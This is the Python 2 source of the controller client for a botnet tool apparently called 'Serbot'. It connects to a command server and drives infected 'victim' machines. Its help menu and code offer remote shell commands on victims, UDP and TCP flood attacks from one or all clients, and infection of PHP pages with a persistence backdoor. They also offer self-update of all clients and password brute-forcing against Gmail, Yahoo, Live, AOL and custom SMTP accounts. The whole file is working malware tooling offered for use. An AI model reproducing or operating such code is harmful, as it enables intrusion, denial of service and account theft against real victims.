#!/usr/bin/env python2

import subprocess, os, sys, time, threading
from socket import *

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com
"""

commands = """

Primary:
--------
accept                  | Accept connections
list                    | List connections
clear                   | Clear the console
quit                    | Close all connections and quit
credits                 | Show Credits
help                    | Show this message

Client Interaction:
-------------------
interact <id>           | Interact with client
stop                    | Stop interacting with client
udpflood <ip>:<port>    | UDP flood threw client
tcpflood <ip>:<port>    | TCP flood threw client
serbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will run the Serbot Client (if killed) again
rmbackdoor <web dir>    | Removes the Malicious PHP Code

Wide Commands:
--------------
udpfloodall <ip>:<port> | Same as `udpflood` but for All clients
tcpfloodall <ip>:<port> | Same as `tcpflood` but for All clients
selfupdateall           | Update all Clients with the new version from Github

Bruteforce:
-----------
gmailbruteforce <email>:<keys>:<min>:<max>
yahoobruteforce <email>:<keys>:<min>:<max>
livebruteforce <email>:<keys>:<min>:<max>
aolbruteforce <email>:<keys>:<min>:<max>
	Example: gmailbruteforce someone@gmail.com:0123456789:6:8
custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
	Example: custombruteforce smtp.whatever.com:587:something@whatever.com:abcdefghi:4:6

\n"""

if (len(sys.argv) == 4):
	host = sys.argv[1]
	port = int(sys.argv[2])
	password = sys.argv[3]
else:
	sys.exit("Usage: client.py <server ip> <server bridge port> <password>")

def main():
	print intro
	try:
		s=socket(AF_INET, SOCK_STREAM)
		s.connect((host,port))
	except:
		sys.exit("[ERROR] Can't connect to server")

	s.send(password)

	while 1:
		command = raw_input("> ")
		try:
			if (command == "accept"):
				s.send("accept")
				print s.recv(20480)
			elif (command == "list"):
				s.send("list")
				print s.recv(20480)
			elif ("interact " in command):
				s.send(command)
				temporary = s.recv(20480)
				if ("ERROR" not in temporary):
					victimpath = s.recv(20480)
					if ("ERROR" not in victimpath):
						breakit = False
						while (breakit == False):
							msg = raw_input(victimpath)
							allofem = msg.split(";")
							for onebyone in allofem: #This your happy day one liners
								if (onebyone == "stop"):
									s.send("stop")
									print "\n"
									breakit = True
								elif ("cd " in onebyone):
									s.send(onebyone)
									victimpath = s.recv(20480)
									if ("ERROR" in victimpath):
										print victimpath
										breakit = True
								elif (onebyone == ""):
									print "[CONTROLLER] Nothing to be sent...\n"
								else:
									s.send(onebyone)
									print s.recv(20480)
					else:
						print victimpath
						break
				else:
					print temporary
			elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
				s.send(command)
				print "\n"
			elif (command == "selfupdateall"):
				s.send("selfupdateall")
				print "\n"		
			elif(command == "clear"):
				if sys.platform == 'win32':
					os.system("cls")
				else:
					os.system("clear")
			elif(command == "quit"):
				s.send("quit")
				s.close()
				break
			elif(command == "help"):
				print commands
			elif(command == "credits"):
				print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
			else:
				print "[CONTROLLER] Invalid Command\n"
		except KeyboardInterrupt:
			try:
				s.send("quit")
				s.close()
				print ""
				break
			except:
				pass
		except:
			print "[CONTROLLER] Connection Closed"
			s.close()
			break
		
main()
